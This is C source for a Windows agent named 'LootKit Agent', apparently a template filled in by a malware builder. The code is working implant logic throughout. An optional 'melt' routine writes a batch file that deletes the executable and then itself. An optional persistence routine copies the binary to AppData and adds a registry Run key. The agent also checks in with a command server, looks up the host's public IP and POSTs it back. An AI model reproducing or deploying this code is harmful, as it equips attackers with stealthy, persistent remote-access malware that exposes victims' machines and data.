#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#include <libgen.h>
#include <shlobj.h>

#ifdef MELT_SELECT
void melt_file(char *filepath)
{
    FILE *fp;
    fp = fopen("delete_me.bat", "w");
    if (fp == NULL)
    {
        perror("Error opening file");
        exit(1);
    }

    fprintf(fp, "@echo off\n"
                ":loop\n"
                "timeout /t 1 >nul\n"
                "del \"%s\"\n"
                "if exist \"%s\" goto loop\n"
                "start /b \"\" cmd /c del \"%%~f0\" & exit\n",
            filepath, filepath);

    fclose(fp);
    system("start delete_me.bat");
}
#endif

#ifdef STARTUP_SELECT
void add_to_startup(char *filepath)
{
    int response = MessageBoxA(NULL, "Do you want to add this program to startup?", "Permission Required", MB_YESNO);

    if (response == IDYES)
    { // Corrected here
        // Get the AppData directory
        char appDataPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath)))
        {
            // Extract the filename from filepath
            char *filename = basename(filepath);

            // Construct the path where the executable will be copied
            char newFilePath[MAX_PATH];
            snprintf(newFilePath, sizeof(newFilePath), "%s\\%s", appDataPath, filename);

            // Copy the file
            if (CopyFileA(filepath, newFilePath, FALSE))
            {
                HKEY hKey;
                const char *czStartName = "MyProgram";
                if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
                {
                    RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE *)newFilePath, strlen(newFilePath) + 1);
                    RegCloseKey(hKey);
                }
            }
        }
    }
}
#endif

void send_get_request(char *full_url)
{
    HINTERNET hInternet = InternetOpenA("LootKit Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hSession = InternetOpenUrlA(hInternet, full_url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    InternetCloseHandle(hSession);
}

char *get_ip_info()
{
    char *ip_url = "https://ip.nf/me.json";
    HINTERNET hInternet2 = InternetOpenA("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hSession2 = InternetOpenUrlA(hInternet2, ip_url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    static char buffer[1024];
    DWORD bytesRead;
    DWORD totalBytesRead = 0;
    while (InternetReadFile(hSession2, buffer + totalBytesRead, sizeof(buffer) - totalBytesRead - 1, &bytesRead) && bytesRead)
    {
        totalBytesRead += bytesRead;
    }
    buffer[totalBytesRead] = '\0';
    InternetCloseHandle(hSession2);
    InternetCloseHandle(hInternet2);
    return buffer;
}

void send_post_request(char *full_url, char *buffer, DWORD totalBytesRead)
{
    char hostname[256];
    char path[1024];
    sscanf(full_url, "https://%255[^/]%1023s", hostname, path);
    HINTERNET hInternet = InternetOpenA("LootKit Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnectA(hInternet, hostname, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL)
    {
        fprintf(stderr, "InternetConnectA failed (%d)\n", GetLastError());
        exit(1);
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (hRequest == NULL)
    {
        fprintf(stderr, "HttpOpenRequestA failed (%d)\n", GetLastError());
        InternetCloseHandle(hConnect);
        exit(1);
    }

    if (!HttpSendRequestA(hRequest, NULL, 0, buffer, totalBytesRead))
    {
        fprintf(stderr, "HttpSendRequestA failed (%d)\n", GetLastError());
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
}

int main(int argc, char *argv[])
{
    char *uuid = "{{uuid}}";
    char *name = "{{name}}";
    char check_in_url[] = "http://127.0.0.1/api/check-in/";
    char *full_url = malloc(strlen(check_in_url) + strlen(uuid) + strlen(name) + 20);
    if (!full_url)
    {
        perror("Error allocating memory");
        return 1;
    }
    sprintf(full_url, "%s?uuid=%s&name=%s", check_in_url, uuid, name);

#ifdef STARTUP_SELECT
    if (argc < 1)
    {
        fprintf(stderr, "Error: argv[0] is not available.\n");
        free(full_url);
        return 1;
    }
    add_to_startup(argv[0]);
#endif

#ifdef MELT_SELECT
    if (argc < 1)
    {
        fprintf(stderr, "Error: argv[0] is not available.\n");
        free(full_url);
        return 1;
    }
    melt_file(argv[0]);
#endif

    send_get_request(full_url);
    char *buffer = get_ip_info();
    printf("\n%s\n", buffer);
    send_post_request(full_url, buffer, strlen(buffer));
    printf("\nPress any key to exit...\n");
    getchar();
    free(full_url);

    return 0;
}
